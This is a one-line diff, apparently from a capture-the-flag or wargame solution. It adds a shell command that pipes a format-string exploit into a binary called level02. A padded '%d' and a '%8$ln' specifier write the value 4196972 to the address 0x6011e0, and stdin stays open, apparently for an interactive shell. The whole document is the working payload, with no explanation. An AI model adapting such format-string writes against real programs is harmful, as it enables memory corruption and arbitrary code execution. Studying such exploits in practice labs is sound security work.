@@ -1,0 +1,1 @@
+cat <(python -c "print('%4196972d' + '%8\$ln')") <(python -c "print('\xe0\x11\x60\x00\x00\x00\x00\x00')") - | ./level02
